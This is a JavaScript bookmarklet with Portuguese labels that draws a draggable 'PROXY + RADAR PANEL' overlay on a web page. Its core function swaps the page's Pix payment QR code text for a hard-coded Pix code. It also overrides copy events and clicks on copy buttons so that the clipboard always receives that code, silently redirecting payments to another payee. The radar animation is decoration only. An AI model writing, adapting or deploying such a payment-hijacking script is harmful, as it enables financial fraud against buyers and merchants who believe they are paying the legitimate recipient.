javascript:(function(){

const novoCodigo = "00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/ee7ec1f215234fbd96bb8d0bce76767c5204000053039865802BR5905EFISA6008SAOPAULO62070503***6304077D";

// ===== CONFIG =====
const ID='proxy-radar-panel';
const RED='#ff003c', ICE='#00eaff', GREEN='#00ff66';
let minimized=false;

// ===== STYLE =====
const style=document.createElement('style');
style.innerHTML=`
#${ID}{
  position:fixed;top:20px;left:20px;width:320px;background:rgba(5,5,5,.92);
  border-radius:18px;overflow:hidden;z-index:999999;font-family:monospace;
  box-shadow:0 0 25px rgba(255,0,60,.22),0 0 50px rgba(0,234,255,.08);
  border:1px solid rgba(0,234,255,.08);backdrop-filter:blur(6px);
}
.head{
  cursor:move;
  padding:10px;
  font-size:13px;
  font-weight:900;
  color:${ICE};
  display:flex;
  justify-content:space-between;
  align-items:center;
  background:linear-gradient(90deg, rgba(0,234,255,.04), rgba(255,0,60,.03));
  border-bottom:1px solid rgba(255,255,255,.04);
  touch-action:none;
}
.min-btn{cursor:pointer;color:${RED}}
.body{padding:12px}
.minimized .body{display:none}
.radar-shell{width:120px;height:120px;margin:12px auto;}
.radar3d{
  width:100%;height:100%;border-radius:50%;
  background:radial-gradient(circle, rgba(255,0,60,.12), transparent 70%);
}
.ring{
  position:absolute;inset:0;border-radius:50%;
  background:conic-gradient(${RED} var(--p), rgba(255,255,255,.08) 0);
}
.percent{
  position:absolute;inset:0;
  display:flex;align-items:center;justify-content:center;
  color:#fff;font-weight:900;
}
.footer{text-align:center;font-size:10px;margin-top:8px;color:${ICE};}
`;
document.head.appendChild(style);

// ===== HTML =====
const box=document.createElement('div');
box.id=ID;
box.innerHTML=`
  <div class="head">
    <span>◆ PROXY + RADAR PANEL</span>
    <span class="min-btn">—</span>
  </div>
  <div class="body">
    <button id="ativar" style="width:100%;margin-bottom:10px;padding:6px;background:${ICE};border:none;border-radius:5px;color:#000;">ATIVAR QR CODE</button>
    
    <div id="status" style="text-align:center;margin-bottom:10px;">Aguardando...</div>

    <div class="radar-shell">
      <div id="radar" class="radar3d" style="--p:0%">
        <div class="ring"></div>
        <div id="percent" class="percent">0%</div>
      </div>
    </div>

    <div class="footer">
      PROXY PANEL • ● ONLINE
    </div>
  </div>
`;
document.body.appendChild(box);

// ===== ELEMENTOS =====
const statusEl=box.querySelector('#status');
const radar=box.querySelector('#radar');
const percentEl=box.querySelector('#percent');

// ===== FUNÇÃO =====
function aplicar(){
  const qr = document.querySelector(".qr-code-text-inner");
  if(qr) qr.textContent = novoCodigo;

  document.addEventListener("copy", function(e){
    e.preventDefault();
    e.clipboardData.setData("text/plain", novoCodigo);
  });

  document.querySelectorAll(".qr-code-text, .qr-code-text-inner, .copy-emblem")
  .forEach(el=>{
    el.addEventListener("click",(e)=>{
      e.preventDefault();
      navigator.clipboard.writeText(novoCodigo);
      statusEl.innerText="✅ Copiado PROXY";
    });
  });

  statusEl.innerText="🔥 ATIVO";
}

document.getElementById("ativar").onclick=aplicar;

// ===== RADAR =====
function runRadar(){
  let s=Date.now();
  const t=setInterval(()=>{
    const p=Math.min(100,((Date.now()-s)/1000)*100);
    radar.style.setProperty('--p',p+'%');
    percentEl.textContent=(p|0)+'%';
    if(p>=100) clearInterval(t);
  },16);
}

// ===== ARRASTAR (PC + CELULAR) =====
const head = box.querySelector('.head');
let dx, dy, drag = false;

// PC
head.addEventListener("mousedown", (e) => {
  drag = true;
  dx = e.clientX - box.offsetLeft;
  dy = e.clientY - box.offsetTop;
});

document.addEventListener("mousemove", (e) => {
  if (!drag) return;
  box.style.left = e.clientX - dx + "px";
  box.style.top = e.clientY - dy + "px";
});

document.addEventListener("mouseup", () => {
  drag = false;
});

// CELULAR
head.addEventListener("touchstart", (e) => {
  drag = true;
  const touch = e.touches[0];
  dx = touch.clientX - box.offsetLeft;
  dy = touch.clientY - box.offsetTop;
});

document.addEventListener("touchmove", (e) => {
  if (!drag) return;
  const touch = e.touches[0];
  box.style.left = touch.clientX - dx + "px";
  box.style.top = touch.clientY - dy + "px";
});

document.addEventListener("touchend", () => {
  drag = false;
});

// ===== MINIMIZAR =====
box.querySelector('.min-btn').onclick=()=>{
  minimized=!minimized;
  box.classList.toggle('minimized', minimized);
};

})();
